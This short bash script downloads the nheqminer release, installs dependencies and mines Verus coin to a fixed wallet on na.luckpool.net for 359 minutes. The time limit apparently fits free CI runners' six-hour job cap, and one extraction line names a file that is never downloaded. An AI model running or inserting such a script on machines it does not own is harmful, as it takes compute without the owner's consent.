#!/bin/bash
apt update
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
apt install screen libjansson4 -y
apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
tar -xvf nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
timeout 359m nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RBR2mQwhMbMHa1NjSem99Bp7AjK46rjBUw.Rig001 -p x -t 8
